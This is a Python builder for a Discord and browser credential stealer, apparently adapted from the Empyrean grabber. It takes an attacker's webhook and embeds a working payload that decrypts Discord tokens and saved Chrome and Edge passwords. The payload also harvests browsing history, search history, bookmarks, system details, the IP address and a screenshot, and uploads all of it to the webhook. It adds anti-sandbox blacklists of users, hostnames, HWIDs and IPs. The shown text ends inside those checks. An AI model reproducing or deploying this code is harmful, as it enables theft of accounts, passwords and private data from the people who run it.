from pystyle import *
import time
import os

banner = Center.XCenter("""
 ██████╗  ██████╗ ██████╗ ███████╗ █████╗ ████████╗██╗  ██╗███████╗██████╗ 
██╔════╝ ██╔═══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██║  ██║██╔════╝██╔══██╗
██║  ███╗██║   ██║██║  ██║█████╗  ███████║   ██║   ███████║█████╗  ██████╔╝
██║   ██║██║   ██║██║  ██║██╔══╝  ██╔══██║   ██║   ██╔══██║██╔══╝  ██╔══██╗
╚██████╔╝╚██████╔╝██████╔╝██║     ██║  ██║   ██║   ██║  ██║███████╗██║  ██║
 ╚═════╝  ╚═════╝ ╚═════╝ ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
 Made by Godfather, K.Dot#0001 and notaddidix#1400
 HUGE HELP FROM notaddidix#1400 HIS GITHUB IS https://github.com/addi00000/empyrean HE MADE THE GRABBER
 Bro is a W dev trust (also I did not "steal" his code its called borrowing\n\n
""")

__author__ = 'K.Dot#0001'
__version__ = '1.0.0'

print(Colorate.Vertical(Colors.purple_to_red, banner, 2))

WEBHOOK = input(Colors.red + "What is your webhook? -> ")
NAME = input("What would you like the file name to be? -> ")

code = r"""import base64
import ctypes
import json
import os
import re
import shutil
import sqlite3
import subprocess
import sys
import uuid
from threading import Thread
from zipfile import ZipFile

import psutil
import requests
import wmi
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from os.path import exists


def main() -> None:
    debug()

    with open("imp.txt", "w") as f:
        f.write("K.Dot#0001")

    webhook = "&WEBHOOK_URL&"

    threads = []
    for operation in [discord, chromium, ]:
        thread = Thread(target=operation, args=(webhook,))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

    system(webhook)


class discord():
    def __init__(self, webhook: str) -> None:
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"

        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.upload_accounts(webhook)

    def calc_flags(self, flags: int) -> list:
        flags_dict = {
            "DISCORD_EMPLOYEE": {
                "emoji": "<:staff:968704541946167357>",
                "shift": 0,
                "ind": 1
            },
            "DISCORD_PARTNER": {
                "emoji": "<:partner:968704542021652560>",
                "shift": 1,
                "ind": 2
            },
            "HYPESQUAD_EVENTS": {
                "emoji": "<:hypersquad_events:968704541774192693>",
                "shift": 2,
                "ind": 4
            },
            "BUG_HUNTER_LEVEL_1": {
                "emoji": "<:bug_hunter_1:968704541677723648>",
                "shift": 3,
                "ind": 4
            },
            "HOUSE_BRAVERY": {
                "emoji": "<:hypersquad_1:968704541501571133>",
                "shift": 6,
                "ind": 64
            },
            "HOUSE_BRILLIANCE": {
                "emoji": "<:hypersquad_2:968704541883261018>",
                "shift": 7,
                "ind": 128
            },
            "HOUSE_BALANCE": {
                "emoji": "<:hypersquad_3:968704541874860082>",
                "shift": 8,
                "ind": 256
            },
            "EARLY_SUPPORTER": {
                "emoji": "<:early_supporter:968704542126510090>",
                "shift": 9,
                "ind": 512
            },
            "BUG_HUNTER_LEVEL_2": {
                "emoji": "<:bug_hunter_2:968704541774217246>",
                "shift": 14,
                "ind": 16384
            },
            "VERIFIED_BOT_DEVELOPER": {
                "emoji": "<:verified_dev:968704541702905886>",
                "shift": 17,
                "ind": 131072
            },
            "CERTIFIED_MODERATOR": {
                "emoji": "<:certified_moderator:988996447938674699>",
                "shift": 18,
                "ind": 262144
            },
            "SPAMMER": {
                "emoji": "",
                "shift": 20,
                "ind": 1048704
            },
        }

        return [[flags_dict[flag]['emoji'], flags_dict[flag]['ind']] for flag in flags_dict if int(flags) & (1 << flags_dict[flag]["shift"])]

    def upload_accounts(self, webhook: str) -> None:
        webhook = SyncWebhook.from_url(webhook)

        for token in self.tokens:
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                'Content-Type': 'application/json',
                'Authorization': token,
            }

            r = requests.get(self.baseurl, headers=headers).json()
            b = requests.get(
                "https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers)

            username = r["username"] + "#" + r["discriminator"]
            userid = r["id"]
            email = r["email"]
            phone = r["phone"]
            avatar = f"https://cdn.discordapp.com/avatars/{userid}/{r['avatar']}.gif" if requests.get(
                f"https://cdn.discordapp.com/avatars/{userid}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{userid}/{r['avatar']}.png"
            badges = ' '.join(
                [flag[0] for flag in self.calc_flags(r['public_flags'])[::-1]])

            try:
                nitro = 'Nitro Classic' if r['premium_type'] == 1 else 'Nitro Boost'
            except KeyError:
                nitro = 'None'

            if b.json() == []:
                methods = "None"
            else:
                methods = ""
                try:
                    for method in b.json():
                        if method['type'] == 1:
                            methods += " "
                        elif method['type'] == 2:
                            methods += "<:paypal:973417655627288666> "
                        else:
                            methods += ""
                except TypeError:
                    methods += ""

            g = requests.get(
                "https://discord.com/api/v9/users/@me/guilds?with_counts=true", headers=headers)
            hq_guilds = ""
            try:
                for guild in g.json():
                    admin = True if guild['permissions'] == '4398046511103' else False
                    if admin and guild['approximate_member_count'] >= 100:
                        i = requests.get(
                            f"https://discord.com/api/v9/guilds/{guild['id']}/invites", headers=headers)
                        owner = "  " if guild['owner'] else ""

                        if len(i.json()) > 1:
                            hq_guilds += f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: `  {guild['approximate_member_count']} /  {guild['approximate_presence_count']} /  {guild['approximate_member_count'] - guild['approximate_presence_count']} `\n[Join {guild['name']}](https://discord.com/invite/{i.json()[0]['code']})\n"
                        else:
                            hq_guilds += f"\u200b\n**{guild['name']} ({guild['id']})** \n Owner: `{owner}` | Members: `  {guild['approximate_member_count']} /  {guild['approximate_presence_count']} /  {guild['approximate_member_count'] - guild['approximate_presence_count']} `\nNo invite code could be found for this guild\n"

            except TypeError or KeyError:
                pass

            f = requests.get(
                "https://discordapp.com/api/v6/users/@me/relationships", headers=headers)
            hq_friends = ""
            try:
                for friend in f.json():
                    unprefered_flags = [64, 128, 256, 1048704]
                    inds = [flag[1] for flag in self.calc_flags(
                        friend['user']['public_flags'])[::-1]]
                    for flag in unprefered_flags:
                        inds.remove(flag) if flag in inds else None
                    if inds != []:
                        hq_badges = ' '.join([flag[0] for flag in self.calc_flags(
                            friend['user']['public_flags'])[::-1]])
                        hq_friends += f"{hq_badges} - `{friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})`\n"
            except TypeError:
                pass

            embed = Embed(title=f"{username} ({userid})", color=0x000000)
            embed.set_thumbnail(url=avatar)
            embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
                            value=f"```{token}```\n[Click to copy!](https://paste.addi00000.repl.co/?p={token})\n\u200b", inline=False)
            embed.add_field(
                name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=True)
            embed.add_field(name="<a:redboost:996004230345281546> Badges:",
                            value=f"{badges if badges != '' else 'None'}", inline=True)
            embed.add_field(name="<a:pinklv:996004222090891366> Billing:",
                            value=f"{methods if methods != '' else 'None'}", inline=True)
            embed.add_field(name="<a:rainbowheart:996004226092245072> Email:",
                            value=f"{email if email != None else 'None'}", inline=True)
            embed.add_field(name="<:starxglow:996004217699434496> Phone:",
                            value=f"{phone if phone != None else 'None'}", inline=True)

            embed.add_field(name="\u200b", value=f"\u200b",
                            inline=False) if hq_guilds != "" else None
            if hq_guilds != "":
                embed.add_field(
                    name="<a:earthpink:996004236531859588> HQ Guilds:", value=f"{hq_guilds}", inline=False)
            embed.add_field(name="\u200b", value=f"\u200b",
                            inline=False) if hq_friends != "" else None
            if hq_friends != "":
                embed.add_field(
                    name="<a:earthpink:996004236531859588> HQ Friends:", value=f"{hq_friends}", inline=False)
            embed.add_field(name="\u200b", value=f"\u200b",
                            inline=False) if hq_guilds or hq_friends != "" else None

            embed.set_footer(text="github.com/addi00000/empyrean")

            webhook.send(embed=embed, username="Empyrean",
                         avatar_url="https://i.imgur.com/HjzfjfR.png")

    def decrypt_val(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def get_master_key(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]

        return master_key

    def grabTokens(self) -> None:
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome1': self.appdata + '\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\',
            'Chrome2': self.appdata + '\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\',
            'Chrome3': self.appdata + '\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\',
            'Chrome4': self.appdata + '\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\',
            'Chrome5': self.appdata + '\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.appdata + '\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.appdata + '\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.appdata + '\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.appdata + '\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming+f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(
                                    y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming+f'\\{disc}\\Local State'))
                                try:
                                    r = requests.get(self.baseurl, headers={
                                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                        'Content-Type': 'application/json',
                                        'Authorization': token,
                                    })
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token,
                                })
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

        if os.path.exists(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
            for path, _, files in os.walk(self.roaming+"\\Mozilla\\Firefox\\Profiles"):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token,
                                })
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)


class chromium():
    def __init__(self, webhook: str) -> None:
        webhook = SyncWebhook.from_url(webhook)

        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
        }
        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for name, path in self.browsers.items():
            self.masterkey = self.get_master_key(path + '\\Local State')
            self.files = [
                '.\\' + name + '-passwords.txt',
                '.\\' + name + '-web-history.txt',
                '.\\' + name + '-search-history.txt',
                '.\\' + name + '-bookmarks.txt',
            ]

            for file in self.files:
                with open(file, 'w') as f:
                    pass

            for profile in self.profiles:
                self.password(name, path, profile)
                self.web_history(name, path, profile)
                self.search_history(name, path, profile)
                self.bookmarks(name, path, profile)

            with ZipFile('.\\' + name + '-vault.zip', 'w') as zip:
                for file in self.files:
                    zip.write(file)

            for file in self.files:
                if os.path.isfile(file):
                    os.remove(file)

            if os.path.isfile('.\\' + name + '-vault.zip'):
                if not os.path.getsize('.\\' + name + '-vault.zip') > 8000000:
                    webhook.send(file=File('.\\' + name + '-vault.zip'),
                                 username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
                    os.remove('.\\' + name + '-vault.zip')

    def get_master_key(self, path: str) -> str:
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()

        return decrypted_pass

    def password(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        vault = name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open('.\\' + name + '-passwords.txt', 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall():
                url, username, password = res
                password = self.decrypt_password(password, self.masterkey)
                if url != "" and username != "" and password != "":
                    f.write("Username: {:<40} Password: {:<40} URL: {}\n".format(
                        username, password, url))
        cursor.close()
        conn.close()
        os.remove(vault)

    def web_history(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        vault = name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open('.\\' + name + '-web-history.txt', 'a', encoding="utf-8") as f:
            sites = []
            for res in cursor.execute("SELECT url, title, visit_count, last_visit_time FROM urls").fetchall():
                url, title, visit_count, last_visit_time = res
                if url != "" and title != "" and visit_count != "" and last_visit_time != "":
                    sites.append((url, title, visit_count, last_visit_time))

            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write("Visit Count: {:<6} Title: {:<40}\n".format(
                    site[2], site[1]))

        cursor.close()
        conn.close()
        os.remove(vault)

    def search_history(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        vault = name.title() + '-Vault.db'
        shutil.copy2(path, vault)
        conn = sqlite3.connect(vault)
        cursor = conn.cursor()
        with open('.\\' + name + '-search-history.txt', 'a', encoding="utf-8") as f:
            for res in cursor.execute("SELECT term FROM keyword_search_terms").fetchall():
                term = res[0]
                if term != "":
                    f.write("Search: {}\n".format(term))

        cursor.close()
        conn.close()
        os.remove(vault)

    def bookmarks(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\Bookmarks'
        if not os.path.isfile(path):
            return
        shutil.copy2(path, 'bookmarks.json')
        with open('bookmarks.json', 'r', encoding="utf-8") as f:
            for item in json.loads(f.read())['roots']['bookmark_bar']['children']:
                if 'children' in item:
                    for child in item['children']:
                        if 'url' in child:
                            with open('.\\' + name + '-bookmarks.txt', 'a', encoding="utf-8") as f:
                                f.write("URL: {}\n".format(child['url']))
                elif 'url' in item:
                    with open('.\\' + name + '-bookmarks.txt', 'a', encoding="utf-8") as f:
                        f.write("URL: {}\n".format(item['url']))

        os.remove('bookmarks.json')


class system():
    def __init__(self, webhook: str) -> None:
        webhook = SyncWebhook.from_url(webhook)
        embed = Embed(title="\u200b", color=0x000000)

        embed.add_field(name=":bust_in_silhouette: User",
                        value=f"```Display Name: {self.get_display_name()}\nHostname: {os.getenv('COMPUTERNAME')}\nUsername: {os.getenv('USERNAME')}```", inline=False)
        embed.add_field(name="<:CPU:1004131852208066701> System",
                        value=f"```CPU: {wmi.WMI().Win32_Processor()[0].Name}\nGPU: {wmi.WMI().Win32_VideoController()[0].Name}\nRAM: {round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)}\nHWID: {self.get_hwid()}```", inline=False)
        embed.add_field(name=":floppy_disk: Disk",
                        value=f"```{self.get_disk_space()}```", inline=False)
        embed.add_field(name="<:wifi:1004131855374749807> Network",
                        value=f"```IP: {requests.get('https://api.ipify.org').text}\nMAC: {':'.join(re.findall('..', '%012x' % uuid.getnode()))}```", inline=False)

        ImageGrab.grab(bbox=None, include_layered_windows=False,
                       all_screens=True, xdisplay=None).save("screenshot.png")
        embed.set_image(url="attachment://screenshot.png")

        try:
            webhook.send(embed=embed, file=File('.\\screenshot.png', filename='screenshot.png'),
                         username="Empyrean", avatar_url="https://i.imgur.com/HjzfjfR.png")
        except:
            pass

        if os.path.exists("screenshot.png"):
            os.remove("screenshot.png")

    def get_display_name(self) -> str:
        GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
        NameDisplay = 3

        size = ctypes.pointer(ctypes.c_ulong(0))
        GetUserNameEx(NameDisplay, None, size)

        nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
        GetUserNameEx(NameDisplay, nameBuffer, size)

        return nameBuffer.value

    def get_disk_space(self) -> str:
        disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
        for part in psutil.disk_partitions(all=False):
            if os.name == 'nt':
                if 'cdrom' in part.opts or part.fstype == '':
                    continue
            usage = psutil.disk_usage(part.mountpoint)
            disk += ("{:<9} "*4).format(part.device, f"{usage.free/float(1<<30):,.0f} GB",
                                        f"{usage.total/float(1<<30):,.0f} GB", usage.percent) + "\n"

        return disk

    def get_hwid(self) -> str:
        p = subprocess.Popen("wmic csproduct get uuid", shell=True,
                             stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        hwid = ((p.stdout.read() + p.stderr.read()).decode().split("\n")[1])

        return hwid


class debug:
    def __init__(self) -> None:
        if self.checks():
            self.self_destruct()

    def checks(self) -> bool:
        debugging = False

        self.blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
                                 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
        self.blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O',
                                   'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        self.blackListedHWIDS = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D',
                                 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0', '42A82042-3F13-512F-5E3D-6BF4FFFD8518', '38AB3342-66B0-7175-0B23-F390B3728B78', '48941AE9-D52F-11DF-BBDA-503734826431', '032E02B4-0499-05C3-0806-3C0700080009', 'DD9C3342-FB80-9A31-EB04-5794E5AE2B4C', 'E08DE9AA-C704-4261-B32D-57B2A3993518', '07E42E42-F43D-3E1C-1C6B-9C7AC120F3B9', '88DC3342-12E6-7D62-B0AE-C80E578E7B07', '5E3E7FE0-2636-4CB7-84F5-8D2650FFEC0E', '96BB3342-6335-0FA8-BA29-E1BA5D8FEFBE', '0934E336-72E4-4E6A-B3E5-383BD8E938C3', '12EE3342-87A2-32DE-A390-4C2DA4D512E9', '38813342-D7D0-DFC8-C56F-7FC9DFE5C972', '8DA62042-8B59-B4E3-D232-38B29A10964A', '3A9F3342-D1F2-DF37-68AE-C10F60BFB462', 'F5744000-3C78-11EA-8000-3CECEF43FEFE', 'FA8C2042-205D-13B0-FCB5-C5CC55577A35', 'C6B32042-4EC3-6FDF-C725-6F63914DA7C7', 'FCE23342-91F1-EAFC-BA97-5AAE4509E173', 'CF1BE00F-4AAF-455E-8DCD-B5B09B6BFA8F', '050C3342-FADD-AEDF-EF24-C6454E1A73C9', '4DC32042-E601-F329-21C1-03F27564FD6C', 'DEAEB8CE-A573-9F48-BD40-62ED6C223F20', '05790C00-3B21-11EA-8000-3CECEF4400D0', '5EBD2E42-1DB8-78A6-0EC3-031B661D5C57', '9C6D1742-046D-BC94-ED09-C36F70CC9A91', '907A2A79-7116-4CB6-9FA5-E5A58C4587CD', 'A9C83342-4800-0578-1EE8-BA26D2A678D2', 'D7382042-00A0-A6F0-1E51-FD1BBF06CD71', '1D4D3342-D6C4-710C-98A3-9CC6571234D5', 'CE352E42-9339-8484-293A-BD50CDC639A5', '60C83342-0A97-928D-7316-5F1080A78E72', '02AD9898-FA37-11EB-AC55-1D0C0A67EA8A', 'DBCC3514-FA57-477D-9D1F-1CAF4CC92D0F', 'FED63342-E0D6-C669-D53F-253D696D74DA', '2DD1B176-C043-49A4-830F-C623FFB88F3C', '4729AEB0-FC07-11E3-9673-CE39E79C8A00', '84FE3342-6C67-5FC6-5639-9B3CA3D775A1', 'DBC22E42-59F7-1329-D9F2-E78A2EE5BD0D', 'CEFC836C-8CB1-45A6-ADD7-209085EE2A57', 'A7721742-BE24-8A1C-B859-D7F8251A83D3', '3F3C58D1-B4F2-4019-B2A2-2A500E96AF2E', 'D2DC3342-396C-6737-A8F6-0C6673C1DE08', 'EADD1742-4807-00A0-F92E-CCD933E9D8C1', 'AF1B2042-4B90-0000-A4E4-632A1C8C7EB1', 'FE455D1A-BE27-4BA4-96C8-967A6D3A9661', '921E2042-70D3-F9F1-8CBD-B398A21F89C6']
        self.blackListedIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209',
                               '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23', '192.211.110.74', '35.237.47.12', '87.166.50.213', '34.253.248.228', '212.119.227.167', '193.225.193.201', '34.145.195.58', '34.105.0.27', '195.239.51.3', '35.192.93.107']
